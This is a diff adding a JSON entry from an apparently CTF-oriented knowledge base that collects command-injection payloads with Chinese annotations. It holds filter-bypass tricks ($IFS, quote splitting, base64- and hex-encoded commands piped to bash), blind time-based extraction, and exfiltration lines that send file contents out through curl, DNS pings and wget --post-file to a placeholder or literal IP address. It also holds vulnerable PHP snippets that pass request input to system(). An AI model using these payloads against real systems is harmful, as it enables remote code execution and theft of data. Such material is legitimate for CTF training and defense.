@@ -1,0 +1,104 @@
+{
+  "id": "payload-command_injection-001",
+  "type": "payload",
+  "category": "injection",
+  "subcategory": "command_injection",
+  "name": "命令执行 Payload 集合",
+  "description": "从 命令执行.md 提取的实战 Payload",
+  "payloads": [
+    {
+      "payload": "bash\r\ncommand1 | command2 # 管道符前面和后面的命令都会执行，只不过只会返回后者的命令执行结果。如果1执行错误,则2不再执行\r\ncommand1 || command2 # 如果1执行出错，则会执行2\r\ncommand1 & command2 # 先执行1，不管成功与否都会执行2\r\ncommand1 && command2 # 先执行1，如果执行出错则不再执行2，如果1执行成功则会执行2",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "bash\r\ncommand1;command2  # 先执行1再执行2，不管1成功与否都会执行2",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "bash\r\n$IFS  # 不推荐\r\n${IFS} \r\n$IFS$9 \r\n<\r\n<>\r\n{cat,flag.php}\r\n%09 # 制表符Tab键",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "bash\r\n\r\ncat fl\\ag.php # 反斜线转义\r\ncat fl''ag.php # 单引号分割\r\ncat fl\"\"ag.php # 双引号分割\r\necho Y2F0IGZsYWcucGhw |base64 -d |bash # base64编码\r\necho 63617420666c61672e706870 | xxd -r -p | bash # hex 编码\r\ncat f[l]ag.php # 通配符\r\ncat f[k-m]ag.php  # 通配符\r\ncat f?ag.php   # 通配符\r\ncat fla*.php # 通配符\r\ncat f{k..m}ag.php # 通配符\r\na=fl;cat ${a}ag.php # 变量做拼接\r\na=fl;b=ag;cat $a$b.php # 变量做拼接\r\ncat `echo -n 666c61672e706870|xxd -r -p` # 内敛执行\r\necho -n 666c61672e706870|xxd -r -p | xargs cat # 内敛执行",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "bash\r\ncat\t    # 从第一行开始显示全部的文本内容\r\ntac\t    # 从最后一行开始，显示全部分文本内容，与 cat 相反\r\nnl\t    # 显示文本时，输出行号\r\nmore\t    # 按页显示文件内容\r\nless\t    # 如 more 命令差不多，也是按页显示内容\r\nhead\t    # 从头开始显示文件指定的行数，默认只显示前 10 行\r\ntail\t    # 显示文件指定的结尾行数\r\nsort\t    # 对文件内容进行排序",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "php\r\n<?php\r\n// 我们故意允许任意数量的参数\r\n$command = './configure '.$_POST['configure_options'];\r\n$escaped_command = escapeshellcmd($command);w\r\nsystem($escaped_command);\r\n?>",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "php\r\n<?php\r\nsystem('ls '.escapeshellarg($_GET['dir']));\r\n?>",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "plaintext\r\ncurl your_ip:your_port/?query=`cat /flag`",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "bash\r\nping `whoami`.yourname.cn",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "plaintext\r\nping  `xxd -p /flag`.yourname.cn",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "bash\r\nwget --post-file ./flag 120.48.128.24:2333",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "bash\r\nif condition\r\nthen\r\n    command1 \r\n    command2\r\n    ...\r\n    commandN \r\nfi",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "bash\r\nif [ `cut -c 1 /flag` = 'f' ];then sleep 5;fi",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "windows：\r\n‘|’ 直接执行后面的语句\r\n‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句\r\n‘&’ 前面和后面命令都要执行，无论前面真假\r\n&&如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令\r\n\r\nlinux：\r\nLinux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&’ 作用相同",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    },
+    {
+      "payload": "?   可代替任意一个字符\r\n*   可代替0-任意个字符",
+      "context": "命令执行",
+      "source": "命令执行.md"
+    }
+  ],
+  "related_theory": [
+    "theory-command-injection-001"
+  ],
+  "related_pocs": [
+    "pocs/high_value/afrog\\afrog-pocs\\vulnerability\\yunanbao-authservice-fastjson-rce.yaml",
+    "pocs/high_value/afrog\\afrog-pocs\\CNVD\\2020\\CNVD-2020-18740.yaml",
+    "pocs/high_value/afrog\\afrog-pocs\\CNVD\\2022\\CNVD-2022-10270.yaml",
+    "pocs/high_value/afrog\\afrog-pocs\\CVE\\2021\\CVE-2021-36260.yaml",
+    "pocs/high_value/afrog\\afrog-pocs\\CVE\\2022\\CVE-2022-24112.yaml"
+  ],
+  "tags": [
+    "命令执行",
+    "RCE",
+    "远程代码执行",
+    "injection"
+  ],
+  "severity": "high",
+  "source": "Des-CTF-Knowledge/命令执行.md",
+  "last_updated": "2026-10-22"
+}
